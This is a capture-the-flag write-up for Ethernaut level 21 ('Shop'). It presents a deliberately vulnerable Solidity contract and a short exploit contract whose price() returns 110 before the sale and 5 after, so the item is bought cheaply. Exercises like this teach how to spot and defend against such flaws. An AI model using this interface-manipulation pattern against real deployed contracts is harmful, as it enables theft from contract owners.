# Ethernaut 21: Shop - Interfaces

Another Interface challenge as the Elevator challenge - you cannot rely on the implementation

## The Task Intro

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

## The Solution

The shop contract with the buy function relies on an implementation of the price function. Here again we use a smart contract to call the buy function.

Because the buy function uses msg.sender as interface implementation, we can deliver our smart contract as implementation.

To trick the smart contract we first give the price function a price higher than is written in the shop of 110. When setting the price in the second implementation we give a lower price back, paying only 5.

;-)

```apache
interface Buyer {
  function price() external view returns (uint);
}


contract Exploit is Buyer{
    Shop shop;
    uint256 priceStorage = 110;

    constructor(Shop _shop){
        shop = _shop;
    }
    function price() external override view  returns (uint){
        if(!shop.isSold()){
            return priceStorage;
        }else{
            return 5;
        }
    }

    function attack() external {
        shop.buy();
    }
}
```
